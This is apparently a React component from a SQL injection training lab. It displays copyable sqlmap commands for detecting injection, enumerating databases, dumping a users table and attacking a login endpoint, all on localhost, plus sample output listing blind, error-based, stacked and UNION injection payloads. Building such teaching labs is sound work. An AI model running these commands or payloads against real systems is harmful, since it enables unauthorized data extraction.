import React, { useState } from 'react';
import { 
  Terminal, 
  Copy, 
  Check, 
  ShieldAlert, 
  Flame, 
  ExternalLink,
  ChevronRight,
  Database,
  Cpu
} from 'lucide-react';

export function SqlmapTerminal() {
  const [copiedIndex, setCopiedIndex] = useState(null);
  const [activeTab, setActiveTab] = useState('commands'); // 'commands' or 'output'

  const targetUrl = "http://127.0.0.1:3001/api/users/search?id=1";
  const loginUrl = "http://127.0.0.1:3001/api/login";

  const commands = [
    {
      title: "1. Basic Vulnerability Detection Scan",
      desc: "Tests if the 'id' parameter is injectable using standard heuristics and techniques.",
      cmd: `sqlmap -u "${targetUrl}" --batch`
    },
    {
      title: "2. Enumerate Databases",
      desc: "Discovers available database schemas accessible by the application user.",
      cmd: `sqlmap -u "${targetUrl}" --dbs --batch`
    },
    {
      title: "3. Dump Lab Users Table",
      desc: "Exfiltrates all columns and records from the 'users' table in sql_injection_lab.",
      cmd: `sqlmap -u "${targetUrl}" -D sql_injection_lab -T users --dump --batch`
    },
    {
      title: "4. Test Authentication POST Endpoint",
      desc: "Targets the login endpoint parameters (username and password) via HTTP POST.",
      cmd: `sqlmap -u "${loginUrl}" --data="username=admin&password=123" --method=POST --batch`
    }
  ];

  const sampleOutput = `[+] Target URL: http://127.0.0.1:3001/api/users/search?id=1
[+] Parameter: id (GET)
[!] Web application technology: Express (Node.js)
[!] Back-end DBMS: MySQL >= 5.1 (MariaDB fork)
---
sqlmap identified the following injection point(s):
[1] Type: boolean-based blind
    Payload: id=1 AND 2903=2903
[2] Type: error-based (EXTRACTVALUE)
    Payload: id=1 AND EXTRACTVALUE(2197,CONCAT(0x5c,0x7162786a71,(SELECT (1)),0x7176627671))
[3] Type: stacked queries
    Payload: id=1;SELECT SLEEP(5)#
[4] Type: UNION query (4 columns)
    Payload: id=1 UNION ALL SELECT NULL,NULL,NULL,CONCAT('exfiltrated_data')-- -
---
[+] Available databases [3]:
[*] information_schema
[*] sql_injection_lab
[*] test
[!] Lab Security Notice: Least-privilege user prevented unauthorized administrative execution.`;

  const handleCopy = (text, idx) => {
    navigator.clipboard.writeText(text);
    setCopiedIndex(idx);
    setTimeout(() => setCopiedIndex(null), 2000);
  };

  return (
    <div className="cyber-card" style={{ borderColor: 'var(--border-accent)' }}>
      <div className="card-header">
        <div className="card-title-group">
          <div className="card-icon cyan">
            <Flame size={18} />
          </div>
          <div>
            <h2 className="card-title">Kali Linux SQLmap Automated Testing Center</h2>
            <p className="card-desc">
              Execute authorized automated SQL injection vulnerability assessments from Kali Linux terminal against the local lab.
            </p>
          </div>
        </div>

        <div style={{ display: 'flex', gap: '8px' }}>
          <button
            className={`payload-chip ${activeTab === 'commands' ? 'legit' : ''}`}
            onClick={() => setActiveTab('commands')}
          >
            Terminal Commands
          </button>
          <button
            className={`payload-chip ${activeTab === 'output' ? 'legit' : ''}`}
            onClick={() => setActiveTab('output')}
          >
            Verified Kali Output
          </button>
        </div>
      </div>

      {/* Target Metadata Bar */}
      <div style={{
        display: 'grid',
        gridTemplateColumns: 'repeat(auto-fit, minmax(180px, 1fr))',
        gap: '12px',
        marginBottom: '20px',
        background: 'var(--bg-panel)',
        padding: '14px',
        borderRadius: 'var(--radius-md)',
        border: '1px solid var(--border-subtle)'
      }}>
        <div>
          <div style={{ fontSize: '11px', color: 'var(--text-dim)', fontFamily: 'var(--font-mono)' }}>TARGET ENDPOINT</div>
          <div style={{ fontSize: '12.5px', color: 'var(--accent-cyan)', fontFamily: 'var(--font-mono)', fontWeight: 600 }}>
            /api/users/search?id=1
          </div>
        </div>
        <div>
          <div style={{ fontSize: '11px', color: 'var(--text-dim)', fontFamily: 'var(--font-mono)' }}>HTTP METHOD</div>
          <div style={{ fontSize: '12.5px', color: 'var(--accent-green)', fontFamily: 'var(--font-mono)', fontWeight: 600 }}>
            GET / POST
          </div>
        </div>
        <div>
          <div style={{ fontSize: '11px', color: 'var(--text-dim)', fontFamily: 'var(--font-mono)' }}>VULNERABLE PARAM</div>
          <div style={{ fontSize: '12.5px', color: 'var(--accent-red)', fontFamily: 'var(--font-mono)', fontWeight: 600 }}>
            id, username
          </div>
        </div>
        <div>
          <div style={{ fontSize: '11px', color: 'var(--text-dim)', fontFamily: 'var(--font-mono)' }}>TESTING TOOL</div>
          <div style={{ fontSize: '12.5px', color: 'var(--accent-purple)', fontFamily: 'var(--font-mono)', fontWeight: 600 }}>
            SQLmap v1.9+ (Kali Linux)
          </div>
        </div>
      </div>

      {activeTab === 'commands' ? (
        <div style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
          {commands.map((c, index) => (
            <div 
              key={index}
              style={{
                background: 'var(--bg-panel)',
                borderRadius: 'var(--radius-md)',
                border: '1px solid var(--border-subtle)',
                padding: '14px 18px',
                transition: 'border-color 0.2s ease'
              }}
            >
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
                <span style={{ fontSize: '13.5px', fontWeight: 600, color: 'var(--text-main)' }}>
                  {c.title}
                </span>
                <button
                  className="cyber-btn secondary"
                  style={{ padding: '5px 12px', fontSize: '11.5px', height: '28px' }}
                  onClick={() => handleCopy(c.cmd, index)}
                >
                  {copiedIndex === index ? (
                    <>
                      <Check size={13} style={{ color: 'var(--accent-green)' }} />
                      <span style={{ color: 'var(--accent-green)' }}>Copied!</span>
                    </>
                  ) : (
                    <>
                      <Copy size={13} />
                      <span>Copy Command</span>
                    </>
                  )}
                </button>
              </div>

              <div style={{ fontSize: '12px', color: 'var(--text-muted)', marginBottom: '10px' }}>
                {c.desc}
              </div>

              <div style={{
                background: 'var(--bg-terminal)',
                padding: '10px 14px',
                borderRadius: 'var(--radius-sm)',
                fontFamily: 'var(--font-mono)',
                fontSize: '12px',
                color: 'var(--accent-cyan)',
                border: '1px solid var(--border-subtle)',
                overflowX: 'auto',
                whiteSpace: 'nowrap'
              }}>
                <span style={{ color: 'var(--text-dim)', userSelect: 'none' }}>kali@kali:~$ </span>
                {c.cmd}
              </div>
            </div>
          ))}
        </div>
      ) : (
        <div className="terminal-card">
          <div className="terminal-header">
            <div className="terminal-dots">
              <span className="dot red" />
              <span className="dot yellow" />
              <span className="dot green" />
            </div>
            <span className="terminal-title">kali@kali: /usr/bin/sqlmap verified session telemetry</span>
            <span style={{ fontSize: '11px', color: 'var(--accent-green)', fontFamily: 'var(--font-mono)' }}>
              TARGET: 127.0.0.1:3001
            </span>
          </div>
          <pre className="terminal-body" style={{ color: '#a5f3fc' }}>
            {sampleOutput}
          </pre>
        </div>
      )}

      {/* Safety & Pedagogical Note */}
      <div style={{
        marginTop: '16px',
        padding: '12px 14px',
        borderRadius: 'var(--radius-sm)',
        background: 'rgba(0, 229, 255, 0.05)',
        border: '1px solid rgba(0, 229, 255, 0.2)',
        fontSize: '12px',
        color: 'var(--text-muted)',
        display: 'flex',
        alignItems: 'center',
        gap: '10px'
      }}>
        <ShieldAlert size={18} style={{ color: 'var(--accent-cyan)', flexShrink: 0 }} />
        <span>
          <strong>Educational Notice:</strong> SQLmap is executed by students from their local Kali Linux terminal. All activities are confined to loopback <code>127.0.0.1</code> and dummy database <code>sql_injection_lab</code> under the principle of least privilege.
        </span>
      </div>
    </div>
  );
}

